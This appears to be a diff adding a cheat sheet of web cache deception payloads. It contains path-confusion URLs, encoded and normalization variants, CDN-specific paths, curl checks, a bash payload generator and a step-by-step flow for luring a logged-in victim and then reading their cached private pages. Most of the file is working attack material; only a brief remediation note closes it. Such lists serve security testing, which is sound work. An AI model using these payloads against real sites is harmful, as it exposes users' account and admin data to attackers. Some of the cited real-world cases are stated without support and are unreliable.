@@ -1,0 +1,372 @@
+# Web Cache Deception Payloads
+
+## ========================================
+## BASIC CACHE DECEPTION
+## ========================================
+
+# Trick cache into storing private content
+http://target.com/profile/x.css
+http://target.com/account/style.js
+http://target.com/dashboard/image.png
+
+# Server responds with profile page
+# Cache stores it as static resource
+
+## ========================================
+## PATH CONFUSION
+## ========================================
+
+# Append static extensions
+/api/user/settings.css
+/api/user/data.js
+/admin/panel.png
+/dashboard.jpg
+/profile.gif
+
+## ========================================
+## EXPLOITATION FLOW
+## ========================================
+
+# 1. Attacker sends victim link
+http://target.com/account/settings.css
+
+# 2. Victim clicks (authenticated)
+Server returns account settings page
+Cache stores it
+
+# 3. Attacker accesses cached page
+http://target.com/account/settings.css
+Gets victim's cached data
+
+## ========================================
+## STATIC FILE EXTENSIONS
+## ========================================
+
+# Common cached extensions
+.css
+.js
+.jpg
+.jpeg
+.png
+.gif
+.svg
+.ico
+.woff
+.woff2
+.ttf
+.eot
+.pdf
+.mp4
+.mp3
+.webp
+.bmp
+
+## ========================================
+## PATH MANIPULATION
+## ========================================
+
+# Trailing path
+/profile/settings/image.png
+/api/user/data/file.css
+
+# Path parameter
+/account;.css
+/profile%2fstyle.css
+/dashboard/.css
+
+# Encoded paths
+/profile%2f.css
+/account%5c.css
+
+## ========================================
+## CACHE KEY NORMALIZATION
+## ========================================
+
+# Exploit normalization differences
+/profile//.css
+/profile/./style.css
+/profile/../profile/x.css
+
+## ========================================
+## QUERY PARAMETER BYPASS
+## ========================================
+
+# Add query string
+/profile?x=.css
+/account?.js
+/dashboard?file=image.png
+
+## ========================================
+## FRAGMENT EXPLOITATION
+## ========================================
+
+# URL fragment
+/profile#.css
+/account#style.js
+
+## ========================================
+## HEADER MANIPULATION
+## ========================================
+
+# X-Forwarded-Host
+X-Forwarded-Host: attacker.com
+
+# Host header
+Host: target.com
+X-Original-URL: /profile.css
+
+## ========================================
+## CDN-SPECIFIC PAYLOADS
+## ========================================
+
+# Cloudflare
+/api/user.css
+/profile.js
+
+# Akamai
+/account/data.png
+
+# Fastly
+/dashboard.jpg
+
+# AWS CloudFront
+/settings.gif
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Identify sensitive endpoints
+/profile
+/account
+/dashboard
+/settings
+/api/user
+
+# 2. Append static extensions
+/profile.css
+/profile/.css
+/profile/x.css
+
+# 3. Check if cached
+curl -I http://target.com/profile.css
+Look for cache headers
+
+# 4. Access without authentication
+See if cached version accessible
+
+## ========================================
+## CACHE HEADERS TO CHECK
+## ========================================
+
+# Positive indicators
+X-Cache: HIT
+CF-Cache-Status: HIT
+X-Served-By: cache
+Age: 3600
+
+# Cache control
+Cache-Control: public
+Cache-Control: max-age=3600
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: Profile data theft
+1. Send victim: http://target.com/profile/style.css
+2. Victim (logged in) visits
+3. Cache stores profile page
+4. Attacker accesses cached page
+5. Sees victim's profile data
+
+# Example 2: API data leakage
+1. Send: http://target.com/api/user/data.json
+2. Victim visits
+3. Cache stores API response
+4. Attacker gets victim's data
+
+## ========================================
+## ADVANCED TECHNIQUES
+## ========================================
+
+# Bypass cache key normalization
+/profile///.css
+/profile/./data/.././style.css
+
+# Use different methods
+OPTIONS /profile.css
+HEAD /profile.css
+
+# Parameter pollution
+/profile.css?x=1&x=2
+
+## ========================================
+## URL VARIATIONS
+## ========================================
+
+# Trailing slash
+/profile/.css
+/account/.js
+
+# Double extension
+/profile.css.css
+/account.js.js
+
+# Mixed separators
+/profile\.css
+/account/.css
+
+## ========================================
+## CACHE POISONING COMBO
+## ========================================
+
+# Web Cache Deception + Poisoning
+1. Poison cache with malicious content
+2. Use deception to cache private data
+3. Serve both to victim
+
+## ========================================
+## DETECTION PAYLOADS
+## ========================================
+
+# Test payload
+http://target.com/test-$(date +%s).css
+
+# Check if cached
+curl -I http://target.com/test-12345.css
+# Look for cache hit
+
+## ========================================
+## BYPASS TECHNIQUES
+## ========================================
+
+# If extension filtering exists
+Use less common extensions
+.woff, .woff2, .ttf, .eot
+
+# If path validation exists
+Use encoded paths
+Use normalization tricks
+
+## ========================================
+## SENSITIVE DATA TARGETS
+## ========================================
+
+# User data
+/api/user/profile.css
+/account/settings.js
+/user/info.png
+
+# Admin panels
+/admin/dashboard.css
+/admin/users.js
+
+# Private documents
+/documents/private/file.pdf.css
+
+## ========================================
+## REAL-WORLD EXAMPLES
+## ========================================
+
+# PayPal (2017)
+/myaccount/home.css cached user data
+
+# Shopify
+/admin/settings.js cached admin panel
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Manual testing
+Burp Suite Repeater
+curl with cache headers
+
+# Automated
+- Web Cache Deception Scanner
+- Custom scripts
+
+# Check cache behavior
+curl -I -H "Cache-Control: no-cache" URL
+
+## ========================================
+## PREVENTION TESTING
+## ========================================
+
+# Check if server:
+- Validates file extensions
+- Sets proper cache headers
+- Uses consistent path handling
+- Implements cache key normalization
+
+## ========================================
+## PAYLOAD GENERATION
+## ========================================
+
+# Script to generate payloads
+#!/bin/bash
+endpoint="/profile"
+extensions="css js png jpg gif svg ico"
+
+for ext in $extensions; do
+  echo "$endpoint.$ext"
+  echo "$endpoint/.$ext"
+  echo "$endpoint/x.$ext"
+done
+
+## ========================================
+## HEADERS TO SET
+## ========================================
+
+# Force caching
+Cache-Control: public, max-age=3600
+Expires: [future date]
+
+# Check cache status
+X-Cache: HIT (indicates cached)
+
+## ========================================
+## COMMON VULNERABLE PATTERNS
+## ========================================
+
+# Pattern 1: Extension-based caching
+If URL ends with .css/.js, cache it
+
+# Pattern 2: Path-based routing
+/api/* returns data regardless of path
+
+# Pattern 3: Permissive caching
+Cache anything without auth check
+
+## ========================================
+## EXPLOITATION CHECKLIST
+## ========================================
+
+- [ ] Find sensitive endpoints
+- [ ] Test with static extensions
+- [ ] Verify caching behavior
+- [ ] Access without authentication
+- [ ] Extract sensitive data
+- [ ] Test multiple variations
+- [ ] Check different CDNs
+- [ ] Test path normalization
+
+## ========================================
+## REPORTING
+## ========================================
+
+# Vulnerability details
+Severity: High
+Impact: Unauthorized access to user data
+
+Steps to Reproduce:
+1. Send victim: http://target.com/profile.css
+2. Victim visits while authenticated
+3. Access: http://target.com/profile.css
+4. View cached private data
+
+Recommendation:
+- Validate file extensions
+- Set Cache-Control: private for sensitive pages
+- Implement proper cache key handling
